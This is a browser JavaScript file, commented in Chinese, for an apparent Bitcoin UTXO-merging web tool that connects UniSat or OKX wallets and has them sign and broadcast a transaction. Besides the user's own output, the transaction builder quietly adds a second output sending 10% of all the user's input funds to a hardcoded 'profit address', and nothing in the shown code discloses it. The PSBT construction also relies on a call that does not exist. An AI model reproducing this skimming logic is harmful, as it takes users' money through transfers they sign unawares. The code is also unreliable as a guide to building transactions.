// 确保引入 bitcoinjs-lib（需要在页面中引入，或者通过模块加载）
const Bitcoin = window.bitcoinjs || {}; // 如果通过 <script> 引入

document.addEventListener('DOMContentLoaded', async () => {
    let walletProvider = null;
    let walletAddress = null;
    let targetAddress = null;
    const profitAddress = '15Kh1QUbZg9cT9UXvtABjg12RCPmzbNLpd'; // 你的收益地址
    const profitRate = 0.1; // 10% 收益

    const connectButton = document.getElementById('connect-wallet');
    const disconnectButton = document.getElementById('disconnect-wallet');
    const walletStatus = document.getElementById('wallet-status');
    const mergeButton = document.getElementById('merge-utxo');
    const targetAddressInput = document.getElementById('target-address');
    const feeRateInput = document.getElementById('custom-fee-rate');
    const feeRatesDisplay = document.getElementById('fee-rates');

    // 改进的 fetch 方法，处理非 JSON 响应
    async function fetchWithErrorHandling(url, options) {
        const response = await fetch(url, options);
        if (!response.ok) {
            const text = await response.text();
            throw new Error(`HTTP 错误: ${response.status}, 响应: ${text}`);
        }
        const contentType = response.headers.get('content-type');
        if (!contentType || !contentType.includes('application/json')) {
            const text = await response.text();
            throw new Error(`预期 JSON 响应，但收到: ${text}`);
        }
        return response.json();
    }

    // 加载主网费率
    async function loadFeeRates() {
        try {
            const data = await fetchWithErrorHandling('/get-fee-rates');
            if (data.error) {
                throw new Error(data.error);
            }
            feeRatesDisplay.textContent = `快速: ${data.fastestFee}, 中等: ${data.halfHourFee}, 慢速: ${data.hourFee}`;
        } catch (error) {
            console.error('加载费率失败:', error);
            feeRatesDisplay.textContent = '无法加载费率';
        }
    }

    // 检测钱包是否可用（添加延迟重试机制和调试日志）
    async function waitForWallet(walletType, maxRetries = 5, delay = 1000) {
        console.log(`开始检测 ${walletType} 钱包...`);
        for (let i = 0; i < maxRetries; i++) {
            if (walletType === 'unisat' && window.unisat) {
                console.log('UniSat 钱包已加载');
                return window.unisat;
            }
            if (walletType === 'okxweb3' && window.okxwallet) {
                console.log('OKX 钱包对象存在，检查 bitcoin 属性...');
                if (
                    window.okxwallet.bitcoin &&
                    typeof window.okxwallet.bitcoin.connect === 'function' &&
                    typeof window.okxwallet.bitcoin.signPsbt === 'function'
                ) {
                    console.log('OKX 钱包 bitcoin 属性已加载，包括 connect 和 signPsbt 方法');
                    return window.okxwallet;
                }
                console.warn(`OKX 钱包 bitcoin 属性未完全加载，重试 ${i + 1}/${maxRetries}`);
            } else {
                console.warn(`OKX 钱包对象未加载，重试 ${i + 1}/${maxRetries}`);
            }
            await new Promise(resolve => setTimeout(resolve, delay));
        }
        throw new Error(`${walletType === 'unisat' ? 'UniSat' : 'OKX'} 钱包未加载，请确保扩展已安装并启用。建议使用 UniSat 钱包。`);
    }

    // 显示钱包选择弹窗
    function showWalletOptions() {
        const walletOptions = `
            <div id="wallet-modal" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); display: flex; justify-content: center; align-items: center;">
                <div style="background: white; padding: 20px; border-radius: 10px; text-align: center;">
                    <h3>选择钱包</h3>
                    <button id="unisat-wallet">UniSat</button>
                    <button id="okxweb3-wallet">OKXWeb3</button>
                    <button id="cancel-wallet">取消</button>
                </div>
            </div>
        `;
        document.body.insertAdjacentHTML('beforeend', walletOptions);

        // 动态绑定事件
        document.getElementById('unisat-wallet').addEventListener('click', () => connectWallet('unisat'));
        document.getElementById('okxweb3-wallet').addEventListener('click', () => connectWallet('okxweb3'));
        document.getElementById('cancel-wallet').addEventListener('click', () => {
            document.getElementById('wallet-modal').remove();
        });
    }

    // 连接钱包
    async function connectWallet(walletType) {
        try {
            if (walletType === 'unisat') {
                const unisat = await waitForWallet('unisat');
                const accounts = await unisat.requestAccounts();
                walletProvider = 'unisat';
                walletAddress = accounts[0];
            } else if (walletType === 'okxweb3') {
                const okxwallet = await waitForWallet('okxweb3');
                const result = await okxwallet.bitcoin.connect();
                walletProvider = 'okx';
                walletAddress = result.address;
            } else {
                throw new Error('不支持的钱包类型');
            }
            walletStatus.textContent = `已连接钱包: ${walletAddress}`;
            connectButton.style.display = 'none';
            disconnectButton.style.display = 'inline';
            mergeButton.disabled = false;
            document.getElementById('wallet-modal').remove();
        } catch (error) {
            console.error('连接钱包失败:', error);
            walletStatus.textContent = '连接钱包失败: ' + error.message;
            document.getElementById('wallet-modal').remove();
        }
    }

    // 绑定“链接钱包”按钮事件
    if (connectButton) {
        connectButton.addEventListener('click', showWalletOptions);
    } else {
        console.error('未找到 connect-wallet 按钮');
    }

    // 断开连接
    if (disconnectButton) {
        disconnectButton.addEventListener('click', () => {
            walletProvider = null;
            walletAddress = null;
            walletStatus.textContent = '未连接钱包';
            connectButton.style.display = 'inline';
            disconnectButton.style.display = 'none';
            mergeButton.disabled = true;
        });
    }

    // 合并 UTXO 并转账
    if (mergeButton) {
        mergeButton.addEventListener('click', async () => {
            targetAddress = targetAddressInput.value.trim() || walletAddress;
            const feeRate = parseInt(feeRateInput.value) || 10;

            try {
                // 获取 UTXO
                const utxoData = await fetchWithErrorHandling('/get-utxos', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ address: walletAddress })
                });
                const { utxos } = utxoData;
                if (!utxos || utxos.length < 2) throw new Error('至少需要2个UTXO');

                // 构造交易
                const network = Bitcoin.networks.bitcoin; // 主网
                const txb = new Bitcoin.TransactionBuilder(network);
                let totalInput = 0;
                utxos.forEach(utxo => {
                    txb.addInput(utxo.txid, utxo.vout);
                    totalInput += utxo.value;
                });

                const txSize = utxos.length * 148 + 34 + 10;
                const fee = txSize * feeRate;
                const profit = Math.floor(totalInput * profitRate); // 10% 收益
                const outputValue = totalInput - fee - profit;

                if (outputValue <= 0) throw new Error('余额不足以支付费用和收益');

                // 输出：用户目标地址和你的收益地址
                txb.addOutput(targetAddress, outputValue);
                txb.addOutput(profitAddress, profit);

                const psbt = txb.buildIncomplete().toPSBT();

                // 签名
                let signedTxHex;
                if (walletProvider === 'unisat') {
                    console.log('使用 UniSat 钱包签名...');
                    const unisat = await waitForWallet('unisat');
                    signedTxHex = await unisat.signPsbt(psbt.toHex());
                } else if (walletProvider === 'okx') {
                    console.log('使用 OKX 钱包签名...');
                    const okxwallet = await waitForWallet('okxweb3');
                    console.log('OKX 钱包对象:', okxwallet);
                    console.log('OKX 钱包 bitcoin 属性:', okxwallet.bitcoin);
                    if (!okxwallet.bitcoin || typeof okxwallet.bitcoin.signPsbt !== 'function') {
                        console.error('OKX 钱包 bitcoin.signPsbt 方法不可用');
                        throw new Error('OKX 钱包签名功能不可用，请检查扩展状态或使用 UniSat 钱包');
                    }
                    signedTxHex = await okxwallet.bitcoin.signPsbt(psbt.toHex());
                } else {
                    throw new Error('未选择有效的钱包');
                }

                // 广播交易
                const broadcastData = await fetchWithErrorHandling('/broadcast', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ txHex: signedTxHex })
                });
                const { txId } = broadcastData;

                document.location.href = `/?message=UTXO合并并转账成功！&txId=${txId}`;
            } catch (error) {
                console.error('合并 UTXO 失败:', error);
                alert(`合并 UTXO 失败: ${error.message}`);
            }
        });
    }

    // 邀请朋友
    const inviteFriendsButton = document.getElementById('invite-friends');
    if (inviteFriendsButton) {
        inviteFriendsButton.addEventListener('click', () => {
            if (!walletAddress) {
                alert('请先链接钱包！');
                return;
            }
            const inviteUrl = `${window.location.origin}/?ref=${walletAddress}`;
            const inviteLinkDiv = document.getElementById('invite-link');
            const inviteUrlElement = document.getElementById('invite-url');
            inviteUrlElement.href = inviteUrl;
            inviteUrlElement.textContent = inviteUrl;
            inviteLinkDiv.style.display = 'block';
        });
    }

    // 页面加载时加载费率
    loadFeeRates();
});